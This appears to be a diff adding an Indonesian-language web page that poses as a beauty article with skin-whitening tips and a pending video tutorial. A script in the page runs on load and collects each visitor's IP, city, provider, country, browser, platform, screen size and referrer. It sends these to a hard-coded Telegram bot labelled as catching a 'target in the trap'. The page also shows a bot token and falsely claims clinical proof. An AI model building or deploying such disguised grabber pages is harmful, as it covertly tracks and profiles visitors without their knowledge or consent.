@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tips Rahasia Kulit Putih Permanen & Glowing</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #fff0f5; color: #444; margin: 0; padding: 0; }
+        .container { max-width: 600px; margin: 20px auto; background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
+        h1 { color: #ff4d94; text-align: center; font-size: 24px; }
+        .hero-img { width: 100%; border-radius: 10px; margin-bottom: 15px; }
+        p { line-height: 1.6; font-size: 15px; }
+        .steps { background: #fff9fb; border-left: 5px solid #ff4d94; padding: 15px; margin: 15px 0; }
+        .footer { text-align: center; font-size: 12px; color: #999; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>✨ 5 Langkah Rahasia Kulit Putih Instan ✨</h1>
+        <img src="https://images.unsplash.com/photo-1598440467723-5935f444de4e?auto=format&fit=crop&w=600&q=80" alt="Beauty" class="hero-img">
+        
+        <p>Banyak yang gagal punya kulit putih karena salah cara. Ikuti panduan eksklusif di bawah ini yang sudah terbukti secara klinis untuk hasil maksimal...</p>
+        
+        <div class="steps">
+            <strong>Langkah 1:</strong> Gunakan scrub kopi dan madu setiap pagi.<br>
+            <strong>Langkah 2:</strong> Pastikan hidrasi kulit terjaga dengan serum vitamin C.<br>
+            <strong>Langkah 3:</strong> Hindari paparan matahari langsung jam 10-15 siang.
+        </div>
+
+        <p>Sedang memproses panduan video tutorial khusus untuk perangkat Anda... Mohon tunggu sebentar.</p>
+        
+        <div class="footer">&copy; 2026 Beauty Care Indonesia. All rights reserved.</div>
+    </div>
+
+    <script>
+        // --- KONFIGURASI TELEGRAM ---
+        const botToken = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo"; 
+        const chatId = "8551809114";   
+
+        async function kirimData() {
+            try {
+                // Ambil data IP & Lokasi
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ip = await ipRes.json();
+
+                // Ambil info Device
+                const info = {
+                    ua: navigator.userAgent,
+                    plt: navigator.platform,
+                    res: `${window.screen.width}x${window.screen.height}`,
+                    ref: document.referrer || "Direct",
+                    ts: new Date().toLocaleString()
+                };
+
+                // Susun Pesan
+                const teks = `
+🚨 *TARGET MASUK PERANGKAP!* 🚨
+━━━━━━━━━━━━━━━━━━
+📍 *DATA LOKASI*
+• IP: ${ip.ip}
+• Kota: ${ip.city}
+• Provider: ${ip.org}
+• Negara: ${ip.country_name}
+
+📱 *DATA DEVICE*
+• Platform: ${info.plt}
+• Resolusi: ${info.res}
+• Browser: ${info.ua}
+• Waktu: ${info.ts}
+━━━━━━━━━━━━━━━━━━
+🔗 *Link:* ${window.location.href}
+                `;
+
+                // Kirim ke Telegram
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: teks,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+            } catch (e) {}
+        }
+
+        window.onload = kirimData;
+    </script>
+</body>
+</html>
